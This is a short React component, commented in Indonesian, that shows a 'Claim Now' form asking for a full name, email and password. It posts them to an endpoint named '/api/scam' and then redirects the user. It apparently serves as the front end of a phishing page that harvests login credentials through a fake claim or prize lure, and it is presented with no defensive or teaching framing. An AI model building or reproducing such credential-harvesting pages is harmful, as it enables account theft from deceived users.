import React, { useState, type FormEvent } from 'react';

const Buttin = () => {
  const [response, setResponse] = useState("")

  async function submit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault()
    const formData = new FormData(e.target as HTMLFormElement)

    const res = await fetch("/api/scam", {
      method: "POST",
      body: formData
    })
    const data = await res.json()
    setResponse(data.message)

    // Redirect ke halaman lain setelah submit berhasil
    console.log(response)
    window.location.href = "/data"  // Ganti dengan URL halaman yang diinginkan
    if (response) {
    }
  }

  return (
    <form onSubmit={submit}>
      <label>
        Nama Lengkap
        <input type="text" name="nama" id="nama" autoComplete='additional-name'required />
      </label>
      <label>
        Email
        <input type="email" name="email" id="email" autoComplete='email' required />
      </label>
      <label>
        Password
        <input type="password" name="password" id="password" autoComplete='current-password' required />
      </label>
      <button type="submit">Klaim Sekarang</button>
    </form>
  );
};

export default Buttin;
